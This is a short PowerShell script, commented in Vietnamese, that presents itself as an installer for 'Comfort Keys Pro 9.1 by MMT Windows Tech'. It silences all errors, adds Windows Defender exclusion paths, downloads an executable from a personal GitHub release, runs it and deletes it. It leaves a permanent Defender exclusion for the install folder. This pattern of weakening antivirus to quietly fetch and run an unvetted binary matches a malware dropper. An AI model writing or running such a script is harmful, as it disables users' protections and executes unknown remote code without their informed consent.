# Ẩn thông báo lỗi và output
$ErrorActionPreference = 'SilentlyContinue'

# Thêm exclusion paths
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Temp" 2>&1 | Out-Null
Add-MpPreference -ExclusionPath "C:\Comfort Keys Pro 9.1 by MMT Windows Tech" 2>&1 | Out-Null

# Tải file từ GitHub
$downloadUrl = "https://github.com/ghostminhtoan/private/releases/download/MMT/Comfort.Keys.Pro.9.1.by.MMT.Windows.Tech.exe"
$tempPath = [System.IO.Path]::Combine($env:USERPROFILE, "Temp", "Comfort.Keys.Pro.9.1.by.MMT.Windows.Tech.exe")

# Tạo thư mục Temp nếu chưa tồn tại
if (!(Test-Path "$env:USERPROFILE\Temp")) {
    New-Item -Path "$env:USERPROFILE\Temp" -ItemType Directory -Force 2>&1 | Out-Null
}

# Tải file
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath 2>&1 | Out-Null
}
catch {
    Write-Host "Lỗi khi tải file: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# Chạy file cài đặt
try {
    Start-Process -FilePath $tempPath -Wait 2>&1 | Out-Null
    
    # Đợi một chút để đảm bảo quá trình cài đặt hoàn tất
    Start-Sleep -Seconds 5
    
    # Xóa file tải về
    if (Test-Path $tempPath) {
        Remove-Item -Path $tempPath -Force 2>&1 | Out-Null
    }
}
catch {
    Write-Host "Lỗi khi chạy file cài đặt: $($_.Exception.Message)" -ForegroundColor Red
}

# Xóa exclusion temp
Remove-MpPreference -ExclusionPath "$env:USERPROFILE\Temp" 2>&1 | Out-Null

# Thoát PowerShell
exit
